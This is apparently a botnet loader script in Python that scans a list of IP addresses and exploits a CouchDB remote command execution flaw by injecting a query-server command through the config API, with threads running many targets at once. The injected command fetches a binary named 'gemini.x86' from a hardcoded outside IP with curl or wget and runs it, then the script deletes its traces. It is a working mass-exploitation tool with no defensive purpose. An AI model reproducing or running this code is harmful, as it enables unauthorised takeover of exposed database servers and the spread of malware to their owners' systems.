#!/usr/bin/env python
#by ; LNO LiGhT
# change database
from requests.auth import HTTPBasicAuth
#import argparse
import requests
import re
import sys
from threading import Thread
from time import sleep
	
ips = open(sys.argv[1], "r").readlines()

def getVersion(ip):
	version = requests.get(ip).json()["version"]
	return version
 
def error(message):
	print(message)
	sys.exit(1)
 
def exploit(ip):
	try:
		cmd = "curl http://167.99.93.59/bins/gemini.x86 -o gemini.x86" #command here
		cmd = "wget http://167.99.93.59/bins/gemini.x86 -O gemini.x86"
		cmd = "./gemini.x86" #command here
		ip = ip.rstrip("\n")
		ip = "http://"+ip+":5984"
		version = getVersion(ip)
		print("[*] Detected CouchDB Version " + version)
		vv = version.replace(".", "")
		v = int(version[0])
		if v == 1 and int(vv) <= 170:
			version = 1
		elif v == 2 and int(vv) < 211:
			version = 2
		else:
			print("[-] Version " + version + " not vulnerable.")
			sys.exit()
		with requests.session() as session:
			print("[*] Attempting %s Version %d"%(ip,v))
			session.headers = {"Content-Type": "application/json"}
			session.auth = HTTPBasicAuth("guest", "guest")
			try:
				if version == 1:
					session.put(ip + "/_config/query_servers/cmd",
							data='"' + cmd + '"')
					print("[+] Created payload at: " + ip + "/_config/query_servers/cmd")
				else:
					host = session.get(ip + "/_membership").json()["all_nodes"][0]
					session.put(ip + "/_node/" + ip + "/_config/query_servers/cmd",
							data='"' + cmd + '"')
					print("[+] Created payload at: " + ip + "/_node/" + host + "/_config/query_servers/cmd")
			except requests.exceptions.HTTPError as e:
				error("[-] Unable to create command payload: " + e)
	 
			try:
				session.put(ip + "/xgodss")
				session.put(ip + "/xgodss/xzero", data='{"_id": "HTP"}')
			except requests.exceptions.HTTPError:
				error("[-] Unable to create database.")
	 
			# Execute payload
			try:
				if version == 1:
					session.post(ip + "/xgodss/_temp_view?limit=10",
							data='{"language": "cmd", "map": ""}')
				else:
					session.post(ip + "/xgodss/_design/zero",
							data='{"_id": "_design/zero", "views": {"xgodss": {"map": ""} }, "language": "cmd"}')
				print("[+] Command executed: " + cmd)
			except requests.exceptions.HTTPError:
				error("[-] Unable to execute payload.")

			print("[*] Cleaning up.")

			# Cleanup database
			try:
				session.delete(ip + "/xgodss")
			except requests.exceptions.HTTPError:
				error("[-] Unable to remove database.")
	 
			# Cleanup payload
			try:
				if version == 1:
					session.delete(ip + "/_config/query_servers/cmd")
				else:
					host = session.get(ip + "/_membership").json()["all_nodes"][0]
					session.delete(ip + "/_node" + host + "/_config/query_servers/cmd")
			except requests.exceptions.HTTPError:
				error("[-] Unable to remove payload.")
	except:
		pass
for ip in ips:
	try:
		hoho = Thread(target=exploit, args=(ip,))
		hoho.start()
		time.sleep(0.004)
	except:
		pass

